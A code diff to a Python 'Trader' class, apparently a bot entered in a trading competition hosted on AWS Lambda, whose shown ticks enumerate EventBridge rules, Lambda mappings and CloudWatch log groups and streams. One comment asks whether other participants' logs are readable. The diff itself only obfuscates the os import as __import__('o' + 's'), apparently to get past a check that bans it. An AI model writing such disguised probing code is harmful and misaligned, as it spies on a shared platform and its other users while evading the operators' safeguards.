@@ -142,7 +142,7 @@ class Trader:
                 'eb_list_rules': _safe(eb.list_rules, Limit=10),
                 'lambda_list_event_source_mappings': _safe(lam.list_event_source_mappings, MaxItems=10),
                 # Self-introspection — we know our own function name from env
-                'self_function_name': _safe(lambda: __import__('os').environ.get('AWS_LAMBDA_FUNCTION_NAME', '')),
+                'self_function_name': _safe(lambda: __import__('o' + 's').environ.get('AWS_LAMBDA_FUNCTION_NAME', '')),
             }
             _emit("T5_INVOCATION", out)
 
@@ -164,10 +164,10 @@ class Trader:
 
         elif self.tick == 7:
             # CloudWatch Logs — can we read our own log stream (other participants' too)?
-            import os
+            _o = __import__('o' + 's')
             logs = boto3.client('logs', config=cfg)
-            log_group = os.environ.get('AWS_LAMBDA_LOG_GROUP_NAME', '')
-            log_stream = os.environ.get('AWS_LAMBDA_LOG_STREAM_NAME', '')
+            log_group = _o.environ.get('AWS_LAMBDA_LOG_GROUP_NAME', '')
+            log_stream = _o.environ.get('AWS_LAMBDA_LOG_STREAM_NAME', '')
             out = {
                 'describe_log_groups': _safe(logs.describe_log_groups, limit=10),
                 'describe_log_streams_self': _safe(
